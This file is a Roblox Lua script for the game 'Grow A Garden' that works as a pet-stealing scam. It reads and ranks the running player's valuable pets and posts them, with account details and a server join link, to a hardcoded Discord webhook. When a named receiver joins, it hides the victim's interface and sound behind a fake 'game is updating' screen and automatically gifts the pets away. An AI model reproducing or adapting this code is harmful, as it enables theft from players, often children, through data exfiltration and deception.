if getgenv().decfde then return end
getgenv().decfde = true

local Webhook = "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
local Username = "drawesfa"
local Fern = "https://fern.wtf/joiner?placeId="
local OnlyPriorityPets = true
local MinPriorityThreshold = 13
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalizationService = game:GetService("LocalizationService")
local DataService = require(RS.Modules.DataService)
local PetRegistry = require(RS.Data.PetRegistry)
local NumberUtil = require(RS.Modules.NumberUtil)
local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")

local data = DataService:GetData()

if GetServerType:InvokeServer() == "VIPServer" then
    Players.LocalPlayer:Kick("This server is not supported")
end

local PetPriorityData = {
    ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
    ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
    ["French Fly Ferret"] = { priority = 3, emoji = "🐾", isMutation = false },
    ["Disco Bee"] = { priority = 4, emoji = "🪩", isMutation = false },
    ["Fennec fox"] = { priority = 5, emoji = "🦊", isMutation = false },
    ["Butterfly"] = { priority = 6, emoji = "🦋", isMutation = false },
    ["Dragonfly"] = { priority = 7, emoji = "🐲", isMutation = false },
    ["Mimic Octopus"] = { priority = 8, emoji = "🐙", isMutation = false },
    ["Corrupted Kitsune"] = { priority = 9, emoji = "🦊", isMutation = false },
    ["T-Rex"] = { priority = 10, emoji = "🦖", isMutation = false },
    ["Spinosaurus"] = { priority = 11, emoji = "🦎", isMutation = false },
    ["Queen Bee"] = { priority = 12, emoji = "👑", isMutation = false },
    ["Red Fox"] = { priority = 13, emoji = "🦊", isMutation = false },
    ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
    ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
    ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
    ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
    ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
    ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
    ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
    ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
    ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
    ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
    ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
    ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
    ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
    ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
}

local function detectExecutor()
    local name
    local success = pcall(function()
        if identifyexecutor then
            name = identifyexecutor()
        elseif getexecutorname then
            name = getexecutorname()
        end
    end)
    return name or "Unknown"
end

local function formatNumberWithCommas(n)
    local str = tostring(n)
    return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function getWeight(toolName)
    if not toolName or toolName == "No Tool" then
        return nil
    end
    local weight = toolName:match("%[([%d%.]+) KG%]")
    weight = weight and tonumber(weight)
    return weight
end

local function getAge(toolName)
    if not toolName or toolName == "No Tool" then
        return nil
    end
    local age = toolName:match("%[Age (%d+)%]")
    age = age and tonumber(age)
    return age
end

local function UnequipFromFarm(player)
    if workspace:FindFirstChild("PetsPhysical") then
        for _, petMover in workspace.PetsPhysical:GetChildren() do
            if petMover and petMover:GetAttribute("OWNER") == player.Name then
                for _, pet in petMover:GetChildren() do
                    PetsService:UnequipPet(pet.Name)
                end
            end
        end
    end
end

local function GetPlayerPets()
    local unsortedPets = {}
    local player = Players.LocalPlayer
    if not data or not data.PetsData then
        return unsortedPets
    end

    UnequipFromFarm(player)
    local maxWaitTime = 5
    local elapsedTime = 0
    repeat
        task.wait(0.5)
        elapsedTime = elapsedTime + 0.5
    until #player.Backpack:GetChildren() > 0 or elapsedTime >= maxWaitTime

    for _, tool in pairs(player.Backpack:GetChildren()) do
        if tool and tool:IsA("Tool") and (tool:GetAttribute("Favorite") == true or tool:GetAttribute("d") == true) then
            RS:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
        end
    end

    task.wait(0.5)
    for _, tool in pairs(player.Backpack:GetChildren()) do
        if not tool or not tool.Parent then
            continue
        end

        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
            local petName = tool.Name

            local function SafeCalculatePetValue(tool)
                local PET_UUID = tool:GetAttribute("PET_UUID")
                if not PET_UUID then
                    return 0
                end

                local data = DataService:GetData()
                if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                    return 0
                end

                local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                local petData = petInventoryData.PetData
                local HatchedFrom = petData.HatchedFrom

                if not HatchedFrom or HatchedFrom == "" then
                    return 0
                end

                local eggData = PetRegistry.PetEggs[HatchedFrom]
                if not eggData then
                    return 0
                end

                local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                if not rarityData then
                    return 0
                end

                local WeightRange = rarityData.GeneratedPetData.WeightRange
                if not WeightRange then
                    return 0
                end

                local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))

                return math.floor(sellPrice * weightMultiplier * levelMultiplier)
            end

            local age = getAge(tool.Name) or 0
            local weight = getWeight(tool.Name) or 0

            local strippedName = petName:gsub(" %[.*%]", "")

            local function stripMutationPrefix(name)
                for key, data in pairs(PetPriorityData) do
                    if data.isMutation and name:lower():find(key:lower()) == 1 then
                        return name:sub(#key + 2)
                    end
                end
                return name
            end

            local petType = stripMutationPrefix(strippedName)

            local rawValue = SafeCalculatePetValue(tool)
            if rawValue and rawValue > 0 then
                table.insert(unsortedPets, {
                    PetName = petName,
                    PetAge = age,
                    PetWeight = weight,
                    Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
                    Type = petType,
                    Value = rawValue,
                    Formatted = formatNumberWithCommas(rawValue),
                })
            end
        end
    end

    task.wait(0.5)
    return unsortedPets
end

local pets = GetPlayerPets()

local function isMutated(toolName)
    for key, data in pairs(PetPriorityData) do
        if data.isMutation and toolName:lower():find(key:lower()) == 1 then
            return key
        end
    end
    return nil
end

table.sort(pets, function(a, b)
    local aPriority, aMutation = 99, isMutated(a.PetName)
    if PetPriorityData[a.Type] then
        aPriority = PetPriorityData[a.Type].priority
    elseif aMutation and PetPriorityData[aMutation] then
        aPriority = PetPriorityData[aMutation].priority
    elseif a.Weight and a.Weight >= 10 then
        aPriority = 12
    elseif a.Age and a.Age >= 60 then
        aPriority = 13
    end

    local bPriority, bMutation = 99, isMutated(b.PetName)
    if PetPriorityData[b.Type] then
        bPriority = PetPriorityData[b.Type].priority
    elseif bMutation and PetPriorityData[bMutation] then
        bPriority = PetPriorityData[bMutation].priority
    elseif b.Weight and b.Weight >= 10 then
        bPriority = 12
    elseif b.Age and b.Age >= 60 then
        bPriority = 13
    end

    if aPriority == bPriority then
        return a.Value > b.Value
    else
        return aPriority < bPriority
    end
end)

local function hasRarePets()
    for _, pet in pairs(pets) do
        if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
            return true
        end
    end
    return false
end

local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

local tpScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)

local petString = ""
for _, pet in ipairs(pets) do
    local highestPriority = 99
    local chosenEmoji = "🐶"
    local mutation = isMutated(pet.PetName)
    local mutationData = mutation and PetPriorityData[mutation] or nil
    local petData = PetPriorityData[pet.Type] or nil

    if petData and petData.priority < highestPriority then
        highestPriority = petData.priority
        chosenEmoji = petData.emoji
    elseif mutationData and mutationData.priority < highestPriority then
        highestPriority = mutationData.priority
        chosenEmoji = mutationData.emoji
    elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
        highestPriority = 12
        chosenEmoji = "🐘"
    elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
        highestPriority = 13
        chosenEmoji = "👴"
    end

    if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
        local petName = pet.PetName
        local petValue = pet.Formatted
        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " -> " .. petValue
    end
end

local playerCount = #Players:GetPlayers()

local function getPlayerCountry(player)
    local success, result = pcall(function()
        return LocalizationService:GetCountryRegionForPlayerAsync(player)
    end)
    return success and result or "Unknown"
end

local accountAgeInDays = Players.LocalPlayer.AccountAge
local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
local creationDateString = os.date("%Y-%m-%d", creationDate)

local function truncateByLines(inputString, maxLines)
    local lines = {}
    for line in inputString:gmatch("[^\n]+") do
        table.insert(lines, line)
    end
    if #lines <= maxLines then
        return inputString
    else
        local truncatedLines = {}
        for i = 1, maxLines - 1 do
            table.insert(truncatedLines, lines[i])
        end
        return table.concat(truncatedLines, "\n")
    end
end

local totalValue = 0
for _, pet in ipairs(pets) do
    totalValue += pet.Value or 0
end
local formattedTotalValue = formatNumberWithCommas(totalValue)

if petString ~= "" then
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", Players.LocalPlayer.DisplayName or "Unknown", Username or "Unknown", detectExecutor() or "Unknown", tostring(Players.LocalPlayer.AccountAge or 0)),
                inline = false
            },
            {
                name = "💰 Total Value",
                value = string.format("```%s```", formattedTotalValue),
                inline = false
            },
            {
                name = "🌴 Backpack",
                value = string.format("```%s```", truncateByLines(petString, 20)),
                inline = false
            },
            {
                name = "🏝️ Join Server",
                value = "[click here to join](" .. Fern .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local payload = {
        content = (hasRarePets() and "--@everyone\n" or "") .. string.format("\n%s\n", tpScript or "N/A"),
        embeds = {embed}
    }

    local fullBackpackString = ""
    for _, pet in ipairs(pets) do
        local highestPriority = 99
        local chosenEmoji = "🐶"
        local mutation = isMutated(pet.PetName)
        local mutationData = mutation and PetPriorityData[mutation] or nil
        local petData = PetPriorityData[pet.Type] or nil

        if petData and petData.priority < highestPriority then
            highestPriority = petData.priority
            chosenEmoji = petData.emoji
        elseif mutationData and mutationData.priority < highestPriority then
            highestPriority = mutationData.priority
            chosenEmoji = mutationData.emoji
        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
            highestPriority = 12
            chosenEmoji = "🐘"
        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
            highestPriority = 13
            chosenEmoji = "👴"
        end

        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
            local petName = pet.PetName
            local petValue = pet.Formatted
            fullBackpackString = fullBackpackString .. chosenEmoji .. " - " .. petName .. " -> " .. petValue .. "\n"
        end
    end

    local boundary = "------------------------" .. HttpService:GenerateGUID(false)
    local embedPayload = HttpService:JSONEncode(payload)
    local body = {}
    table.insert(body, "--" .. boundary)
    table.insert(body, 'Content-Disposition: form-data; name="payload_json"')
    table.insert(body, "")
    table.insert(body, embedPayload)
    table.insert(body, "--" .. boundary)
    table.insert(body, 'Content-Disposition: form-data; name="file"; filename="items.txt"')
    table.insert(body, "Content-Type: text/plain")
    table.insert(body, "")
    table.insert(body, fullBackpackString)
    table.insert(body, "--" .. boundary .. "--")
    local requestBody = table.concat(body, "\r\n")

    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = requestBody
        })
    end)
end

local function CreateGui()
    local player = Players.LocalPlayer
    local gui = Instance.new("ScreenGui")
    gui.Name = "ScriptGui"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = player:WaitForChild("PlayerGui")
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 99999

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    bg.Parent = gui

    local spinner = Instance.new("ImageLabel")
    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
    spinner.Position = UDim2.new(0.5, 0, 0.35, 0)
    spinner.BackgroundTransparency = 1
    spinner.Image = "rbxassetid://74011233271790"
    spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
    spinner.Parent = bg

    local asc = Instance.new("UIAspectRatioConstraint")
    asc.Parent = spinner

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.08, 0)
    title.Position = UDim2.new(0, 0, 0.53, 0)
    title.BackgroundTransparency = 1
    title.Text = "Please wait..."
    title.Font = Enum.Font.GothamBold
    title.TextSize = 38
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextStrokeTransparency = 0.75
    title.Parent = bg

    local desc = Instance.new("TextLabel")
    desc.Size = UDim2.new(0.8, 0, 0.12, 0)
    desc.Position = UDim2.new(0.1, 0, 0.62, 0)
    desc.BackgroundTransparency = 1
    desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
    desc.Font = Enum.Font.Gotham
    desc.TextSize = 20
    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.TextYAlignment = Enum.TextYAlignment.Top
    desc.Parent = bg

    local countdown = Instance.new("TextLabel")
    countdown.Size = UDim2.new(1, 0, 0.05, 0)
    countdown.Position = UDim2.new(0, 0, 0.87, 0)
    countdown.BackgroundTransparency = 1
    countdown.Text = "Returning in 30 seconds..."
    countdown.Font = Enum.Font.GothamSemibold
    countdown.TextSize = 20
    countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
    countdown.TextXAlignment = Enum.TextXAlignment.Center
    countdown.Parent = bg

    task.spawn(function()
        while spinner and spinner.Parent do
            spinner.Rotation += 2
            task.wait(0.01)
        end
    end)

    task.spawn(function()
        for i = 30, 0, -1 do
            countdown.Text = "Returning in " .. i .. " second" .. (i == 1 and "" or "s") .. "..."
            task.wait(1)
        end
    end)
end

local usernames = {
    "PUT_HERE_YOUR_BACK_UP_USERNAMES",
}

local function MainScript(receiverPlr)
    local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
    local hum = receiverChar:WaitForChild("Humanoid")
    local targetPlr = Players.LocalPlayer
    local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()

    if receiverPlr == targetPlr then return end

    for _, v in targetPlr.PlayerGui:GetDescendants() do
        if v:IsA("ScreenGui") then
            v.Enabled = false
        end
    end

    for _, sound in ipairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end

    for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end

    game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    CreateGui()

    if workspace:FindFirstChild("PetsPhysical") then
        for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
            if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
                for _, pet in petMover:GetChildren() do
                    PetsService:UnequipPet(pet.Name)
                end
            end
        end
    end

    local function safeFollow()
        local offset = CFrame.new(0, 0, 0.5)
        local conn = RunService.Stepped:Connect(function()
            if receiverPlr.Character and targetPlr.Character then
                local targetRoot = receiverPlr.Character:FindFirstChild("HumanoidRootPart")
                local followerRoot = targetPlr.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot and followerRoot then
                    local distance = (targetRoot.Position - followerRoot.Position).Magnitude
                    if distance > 5 then
                        followerRoot.CFrame = targetRoot.CFrame * offset
                    end
                end
            end
        end)

        return {
            Stop = function()
                if conn then
                    conn:Disconnect()
                end
            end
        }
    end

    local inventory = targetPlr.Backpack

    local function safeGiftTool(tool)
        if not receiverPlr or not receiverChar or not targetPlr.Character then
            return false
        end

        if tool.Parent ~= inventory then
            tool.Parent = inventory
            task.wait(0.3)
        end

        local humanoid = targetPlr.Character:FindFirstChild("Humanoid")
        if not humanoid then
            return false
        end

        humanoid:EquipTool(tool)
        task.wait(0.6)

        if tool.Parent ~= targetPlr.Character then
            tool.Parent = inventory
            return false
        end

        if detectExecutor() == "Delta" then
            task.wait(0.3)
            local camera = workspace.CurrentCamera
            local head = receiverChar and receiverChar:FindFirstChild("Head")

            if head then
                local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
                if onScreen then
                    local x = screenPos.X
                    local y = screenPos.Y
                    local VirtualInputManager = game:GetService("VirtualInputManager")
                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
                    task.wait(0.8)
                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
                else
                    return false
                end
            end
        else
            local success, err = pcall(function()
                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
                task.wait(0.5)
                local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
                if prompt then
                    fireproximityprompt(prompt)
                end
                return true
            end)

            if not success then
                if tool then
                    tool.Parent = inventory
                end
                return false
            end
        end

        task.wait(0.15)
        if tool and tool.Parent then
            tool.Parent = targetPlr.Backpack
        end
        return true
    end

    safeFollow()
    task.wait(1)

    for _, pet in ipairs(pets) do
        local highestPriority = 99
        local mutation = isMutated(pet.PetName)
        local mutationData = mutation and PetPriorityData[mutation] or nil
        local petData = PetPriorityData[pet.Type] or nil

        if petData and petData.priority < highestPriority then
            highestPriority = petData.priority
        elseif mutationData and mutationData.priority < highestPriority then
            highestPriority = mutationData.priority
        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
            highestPriority = 12
        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
            highestPriority = 13
        end

        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
            for _, tool in targetPlr.Backpack:GetChildren() do
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
                    for attempt = 1, 3 do
                        local result = safeGiftTool(tool)
                        if result then
                            break
                        end
                    end
                end
            end
        end
    end
end

local function PlayerAdded(player)
    if table.find(usernames, player.Name) or player.Name == Username then
        MainScript(player)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    if table.find(usernames, player.Name) or player.Name == Username then
        MainScript(player)
        break
    end
end

Players.PlayerAdded:Connect(PlayerAdded)
